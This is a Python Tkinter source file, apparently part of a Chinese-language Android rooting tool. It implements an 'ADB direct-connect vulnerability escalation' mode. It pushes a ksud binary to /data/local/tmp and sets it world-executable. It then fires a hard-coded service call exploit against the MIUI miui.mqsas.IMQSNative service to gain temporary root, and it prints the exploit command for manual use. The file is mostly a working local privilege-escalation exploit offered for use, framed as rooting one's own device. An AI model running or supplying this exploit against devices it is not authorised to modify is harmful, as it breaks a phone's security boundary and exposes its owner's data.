# -*- coding: utf-8 -*-
"""模式2：ADB 直连漏洞提权"""

import time
import tkinter as tk
from tkinter import ttk, messagebox, simpledialog

import core
import main as ui

EXPLOIT_CMD = ('service call miui.mqsas.IMQSNative 21 i32 1 '
               's16 /data/local/tmp/ksud i32 1 s16 late-load '
               's16 /sdcard/ksulog.txt i32 60')


class AdbFrame(tk.Frame):
    def __init__(self, parent, app):
        super().__init__(parent, bg=ui.C_BG)
        self.app = app

        p = ui.panel(self)
        p.pack(fill='both', expand=True, padx=1, pady=1)
        inner = tk.Frame(p, bg=ui.C_PANEL)
        inner.pack(fill='both', expand=True, padx=14, pady=12)

        ui.header(inner, 'ADB 直连漏洞提权',
                  '利用设备已开启的 USB 调试，通过 service call 漏洞加载 ksud 获取临时 Root。\n'
                  '注意：Android 14+ 上该漏洞可能已修复，提权不一定成功。')

        self.lbl_dev = ttk.Label(inner, text='设备状态：检测中...', style='Panel.TLabel')
        self.lbl_dev.pack(anchor='w', pady=(0, 4))
        self.lbl_sdk = ttk.Label(inner, text='', style='Muted.TLabel')
        self.lbl_sdk.pack(anchor='w', pady=(0, 12))

        box = tk.Frame(inner, bg=ui.C_PANEL)
        box.pack(fill='x')

        ui.button(box, '一键提权（推送 + 提权）', self.do_full, accent=True)
        ui.button(box, '仅推送 ksud', self.do_push_only)
        ui.button(box, '执行自定义 Shell 命令', self.do_custom)
        ui.button(box, '检查 Root 状态', self.do_check_root)

        # 说明
        tip = tk.Frame(inner, bg='#f7f9fc', highlightbackground='#e2e5ea',
                       highlightthickness=1)
        tip.pack(fill='x', pady=(16, 0))
        tk.Label(tip, text='执行流程说明', bg='#f7f9fc', fg=ui.C_TEXT,
                 font=ui.FONT_BOLD).pack(anchor='w', padx=12, pady=(10, 4))
        steps = [
            '1. adb push ksud /data/local/tmp/       （推送提权载荷）',
            '2. adb shell chmod 777 /data/local/tmp/ksud',
            '3. service call miui.mqsas.IMQSNative ... late-load',
            '4. 验证 su 是否生效，并读取 /sdcard/ksulog.txt',
            '',
            '若提权成功，请打开 KernelSU Manager 确认状态。',
            '若失败（Android 14+ 常见），请改用模式 3 的 Fastboot 流程。',
        ]
        for s in steps:
            tk.Label(tip, text=s, bg='#f7f9fc', fg=ui.C_MUTED,
                     font=ui.FONT_MONO, anchor='w').pack(anchor='w', padx=12)
        tk.Frame(tip, bg='#f7f9fc', height=8).pack()

    def on_device_change(self, st):
        self.lbl_dev.configure(
            text='设备状态：ADB 已连接' if st.adb else '设备状态：ADB 未连接',
            foreground=ui.C_OK if st.adb else ui.C_ERR)
        if st.adb:
            self._load_sdk()
        else:
            self.lbl_sdk.configure(text='')

    def _load_sdk(self):
        def job(_ctl):
            return core.getprop(self.app.runner, 'ro.build.version.sdk')

        def done(sdk):
            # on_done 在后台线程执行，必须经 ui_call 调度回主线程再改控件
            def apply():
                if not ui.widget_alive(self.lbl_sdk):
                    return
                if sdk:
                    note = ('（Android 14+ 提权成功率较低）'
                            if sdk.isdigit() and int(sdk) >= 34 else '')
                    self.lbl_sdk.configure(text='SDK 版本：%s %s' % (sdk, note))
                else:
                    self.lbl_sdk.configure(text='SDK 版本：读取失败')
            self.app.ui_call(apply)

        core.Task(job, on_done=done).start()

    # -----------------------------------------------------------
    def _require(self):
        if not ui.require_adb(self.app):
            return False
        if not self.app.runner.run(['adb', 'get-state'], quiet=True, timeout=15).ok:
            messagebox.showerror('设备异常', 'ADB 设备未就绪，请重新连接或重新授权调试。')
            return False
        return True

    def do_full(self):
        if not self._require():
            return
        self.app.run_task(self._work_full, busy_text='正在推送并提权...',
                          done_text='提权流程结束')

    def _work_full(self, ctl):
        app = self.app
        r = app.runner

        app.log_out('========== ADB 直连漏洞提权 ==========')

        if not self._push(app):
            return False

        app.log_out('[步骤3] 执行 service call 漏洞...')
        res = r.run(['adb', 'shell', EXPLOIT_CMD], quiet=True, timeout=40)
        if not res.ok:
            app.log_out('[错误] service call 命令执行失败，漏洞利用可能未触发。')
            return False

        app.log_out('[提示] 命令已发送，等待 3 秒让内核加载模块...')
        time.sleep(3)

        app.log_out('[步骤4] 验证 Root 状态...')
        if core.is_root(r):
            app.log_out('[成功] Root 已获取，su 命令生效。')
            app.log_out('请打开 KernelSU Manager 查看模块状态。')
        else:
            app.log_out('[!] 提权命令已发送，但尚未获得 Root。')
            logres = r.shell('cat /sdcard/ksulog.txt', quiet=True, timeout=15)
            if logres.lines:
                app.log_out('---------- /sdcard/ksulog.txt ----------')
                for line in logres.lines[-25:]:
                    app.log_out(line)
                app.log_out('----------------------------------------')
            app.log_out('若设备上的漏洞已不可用，请改用模式 3（Fastboot 流程）。')
        return True

    def _push(self, app):
        r = app.runner
        ksud = core.find_ksud()
        if not ksud:
            app.log_out('[错误] 工具目录（或 tools/）下找不到 ksud 文件。')
            return False
        app.log_out('[步骤1] 推送 ksud 到 /data/local/tmp/ ...')
        if not r.run(['adb', 'push', ksud, '/data/local/tmp/'],
                     quiet=True, timeout=90).ok:
            app.log_out('[错误] adb push 失败，请检查 USB 连接是否稳定。')
            return False
        app.log_out('[步骤2] 赋予执行权限...')
        if not r.shell('chmod 777 /data/local/tmp/ksud', quiet=True, timeout=20).ok:
            app.log_out('[错误] chmod 失败，请确认调试授权正常。')
            return False
        app.log_out('[成功] ksud 已推送并授权。')
        return True

    def do_push_only(self):
        if not self._require():
            return

        def job(_ctl):
            app = self.app
            app.log_out('========== 仅推送 ksud ==========')
            ok = self._push(app)
            if ok:
                app.log_out('')
                app.log_out('手动提权命令（可复制到终端执行）：')
                app.log_out('adb shell "%s"' % EXPLOIT_CMD)
            return ok

        self.app.run_task(job, busy_text='正在推送 ksud...', done_text='推送完成')

    def do_custom(self):
        if not self._require():
            return
        cmd = simpledialog.askstring(
            '自定义 Shell 命令',
            '请输入要在设备上执行的命令（不含 adb shell 前缀）：\n\n'
            '警告：命令将直接下发到设备执行，请确认无误后再运行。',
            parent=self)
        if not cmd or not cmd.strip():
            return

        # 这是全程序最危险的入口：任意命令会直接下发到设备执行。
        # 即便用户已在输入框确认过，仍要求二次确认，避免误触或粘贴错误。
        if not messagebox.askyesno(
                '确认执行命令',
                '即将在设备上以以下命令执行：\n\n%s\n\n'
                '命令会直接下发到设备，执行后无法撤销。确认继续吗？' % cmd,
                parent=self):
            self.app.log_out('[已取消] 用户放弃了自定义命令执行。')
            return

        def job(_ctl):
            app = self.app
            app.log_out('---------- 自定义命令：%s ----------' % cmd)
            res = app.runner.shell(cmd, timeout=120)
            app.log_out('---------- 执行结束（返回码 %d）----------' % res.code)
            return res

        self.app.run_task(job, busy_text='正在执行自定义命令...', done_text='命令执行完毕')

    def do_check_root(self):
        if not ui.require_adb(self.app):
            return

        def job(_ctl):
            app = self.app
            app.log_out('---------- Root 状态检查 ----------')
            ok = core.is_root(app.runner)
            app.log_out('[结果] %s' % ('已获取 Root' if ok else '未获取 Root'))
            return ok

        self.app.run_task(job, busy_text='正在检查 Root 状态...', done_text='检查完毕')
